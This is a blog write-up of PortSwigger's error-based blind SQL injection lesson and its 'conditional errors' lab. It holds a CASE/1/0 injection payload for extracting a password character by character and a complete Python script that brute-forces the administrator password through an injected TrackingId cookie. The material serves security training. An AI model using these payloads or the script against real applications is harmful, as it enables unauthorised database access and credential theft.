---
title: PS SQLi - 4. Error-based SQLi
date: 2023-12-22
categories: [Training, PortSwigger]
tags: [portswigger, sqli, sql, burp, error-based-sqli]
img_path: /assets/portswigger/sqli/error_based_sqli
published: true
---

## Error-based SQLi

**Error-based SQLi** refers to cases where we are able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the database configuration and the error types we are able to trigger:
- We may be able to induce the app to return a specific error response based on the result of a boolean expression. We can exploit this in the same way as the [condition responses](https://cspanias.github.io/posts/PS-SQLi-3.-Blind-SQLi/#exploiting-blind-sqli-by-triggering-conditional-responses).
- We may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQLi vulnerabilities into visible ones ([extracting sensitive data via verbose SQL error messages](https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages)).

## Exploiting blind SQLi by triggering conditional errors

Some apps carry out SQL queries but their behavior does not change, regardless of whether the query returns any data, thus, the [Blind SQLi](https://cspanias.github.io/posts/PS-SQLi-3.-Blind-SQLi/) techniques won't work, because injecting different boolean conditions makes no difference to the app's responses. 

It's often possible to induce the app to return a different response depending on whether a SQL error occurs. We can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the app's response time, such as an error message. This enables us to infer the truth of the injected condition.

Suppot that two requests are sent containing the following `TrackingId` cookie values in turn:

![](cookie_values.png){: .normal}

These inpus use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:
- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

If the error causes a difference in the app's HTTP response, we can use this to determine whether the injected condition is true. Using this technique, we can retrieve data by testing one character at a time:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

> There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the [SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Lab: Blind SQL injection with conditional errors

> **Objective**: _This lab contains a blind SQLi vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQLi vulnerability to find out the password of the `administrator` user. To solve the lab, log in as the `administrator` user._

1. Let's start as usual, by testing for SQLi, 

    ![](lab1_sqli_test.png)

    ![](lab1_sqli_test1.png)

2. The above test suggests that a **syntax error** is having a detectable effect on the response. We now need to confirm that the server is interpreting the injection as a SQL query, i.e., that the error is a SQL syntax error as opposed to any other kind of error. To do this, we first need to construct a subquery using valid SQL syntax:

    ![](lab1_error_type.png)

    ![](lab1_error_type1.png)

3. The queries above indicate that the sever is indeed interpreting the injection as a SQL query, and that we are dealing with an Oracle database which requires all `SELECT` statements to explicitly specify a table name. We can confirm the database type as follows:

    ![](lab1_version.png)

4. Now we now the database type, we can pass an invalid query while preserving valid SQL syntax to be sure that our injection is being processed as a SQL query by the server:

    ![](lab1_error_type2.png)

5. As long as we inject syntactically valid SQL queries, we can use this error response to infer key info about the database. For example, in order to verify that the `users` table exists:

    ![](lab1_users.png)

    > The `WHERE ROWNUM=1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.

6. Next, we want confirm that the user `administrator` exists. If we use a normal query (without inducing any error) we wouldn't be able to confirm that the user exists because no matter which user we tested for, we would always received a HTTP 200 reponse:

    ![](lab1_where_admin.png)

    ![](lab1_where_test.png)

6. What we need to do is to construct a query that includes an error-generating expression and make sure that it works as intended:

    ![](lab1_case.png)

    ![](lab1_case1.png)

7. So we can now swap the `dual` table with the info we need to test, i.e., check if the user `administrator` exists:

    ![](lab1_case_admin_true.png)

    ![](lab1_case_admin_false.png)

    The above works due to SQL's [order of operations](https://learnsql.com/blog/sql-order-of-operations/):

    ![](sql_order_of_operations.png)

    ![](lab1_case_explanation.png)

8. Now we can modify our query and find out the password length. Again, when we get a `500` response that confirms our query:

    ![](lab1_pass_length_8.png)

    ![](lab1_pass_length_20_plus.png)

    ![](lab1_pass_length_20.png)

9. The password is 20 characters long, so we can now use Intruder to brute force its characters one-by-one:

    ![](lab1_payload_pos.png)

    ![](lab1_payload_settings_1.png){: .normal}

    ![](lab1_payload_settings_2.png){: .normal}

    ![](lab1_filter_results.png){: .normal}

    ![](lab1_pass_results.png){: .normal}

10. Now we can log in with the `administrator` account and mark this lab as solved:

    ![](lab1_solved.png)

### Burp-Intruder alternative (faster)

We can create our own brute-forcing script using Python3 that works in exactly the same logic as the Intruder, i.e., trying all lowercase alphanumeric characters and numbers for each of the twenty positions of the password and keeps the correct one based on the `500` response.

This script is a modification of Rana's [code](https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-12/sqli-lab-12.py). The most important modifications are the **automation of cookie grabbing** and the **added comments throughout the code**, among other minor changes, which are highlighted at the top of the script:

```python
#---------------------------------------------------------------------------------------------------------------------------------------------------------#
# Source script:                                                                                                                                          # 
#   Rana Khalil (https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-12/sqli-lab-12.py)                                   #
#                                                                                                                                                         #
# Rana's video walkthrough:                                                                                                                               #
#   https://youtu.be/o__q8CzK2ts?t=2212                                                                                                                   #
#                                                                                                                                                         #
# Lab link:                                                                                                                                               #
#   https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors# #
#                                                                                                                                                         #
# Description:                                                                                                                                            #
#   This code was adapted from the above and modified by kuv4z (https://github.com/CSpanias) as a solution for PortSwigger's Lab: Blind SQLi with         #
#   conditional errors. PortSwigger's solution is based on Burp Intruder which is extremely slow in Community Edition, and this represents a much faster  #
#   way to brute-force the password of the user 'administrator'.                                                                                          #
#                                                                                                                                                         #
# Changes:                                                                                                                                                #
#   1. Remove proxies.                                                                                                                                    #
#   2. Created and used alphanumeric lists directly instead of using ASCII representations and then converting them to alphanumeric.                      #
#   3. Used simplified payload.                                                                                                                           #
#   4. Automated cookie grabbing.                                                                                                                         #
#   5. Added comments throughout the code.                                                                                                                #
#---------------------------------------------------------------------------------------------------------------------------------------------------------#

import sys
import requests
import urllib3
import urllib.parse
import string

# disable certificate-related warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# create a list with all lowercase alphabetic characters
alpha_list = [i for i in string.ascii_lowercase]
# create a list with numeric characters
num_list = [str(i) for i in range(10)]
# combine the two lists
char_list = alpha_list + num_list

def sqli_password(url):
    password_extracted = ""
    # try every position based on the length of the password
    for i in range(1,21):
        # try every character from our character list
        for j in char_list:
            # define the payload to be injected
            sqli_payload = f"' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,{i},1)='{j}')||';"
            # URL encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            # get the cookies of the HTTP GET request
            session = requests.Session()
            response = session.get(url)
            TrackingId = session.cookies.values()[0]
            session = session.cookies.values()[1]
            
            # inject the payload to the 'TrackingId' value
            cookies = {'TrackingId' : TrackingId + sqli_payload_encoded,
                       # set the session cookie
                       'session' : session}
            # define the HTTP GET request
            r = requests.get(
                # the URL to make the GET request to
                url,
                # pass the defined cookie to the request
                cookies=cookies,
                # do not verify certificates 
                verify=False)
            
            # if we get the Internal Server Error 500 as a response,
            # that confirms that a character is found
            if r.status_code == 500:
                # convert from ASCII to alphanumeric 
                password_extracted += j
                # output the character to the screen
                sys.stdout.write('\r' + password_extracted)
                # flush the letter
                sys.stdout.flush()
                # get out of the second for loop and back to the first 
                break
            else:
                sys.stdout.write('\r' + password_extracted + j)
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit()
        
        
    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

# execute the main function
if __name__ == "__main__":
    main()
```

> GitHub repo: [lab12_blindSqliWithConditionalgErrors.py](https://raw.githubusercontent.com/CSpanias/cspanias.github.io/main/assets/portswigger/sqli/error_based_sqli/lab1_intruder_alt.py)


## Resources

- [SQL injection](https://portswigger.net/web-security/learning-paths/sql-injection).
- [SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
- Related practice: [DVWA SQLi](https://cspanias.github.io/posts/DVWA-SQL-Injection/), [DVWA SQLi (Blind)](https://cspanias.github.io/posts/DVWA-SQL-Injection-(Blind)/).
- Rhana's [video walkthrough](https://www.youtube.com/watch?v=_7w-KEP_K5w).
- [SQL Order of Operations](https://learnsql.com/blog/sql-order-of-operations/).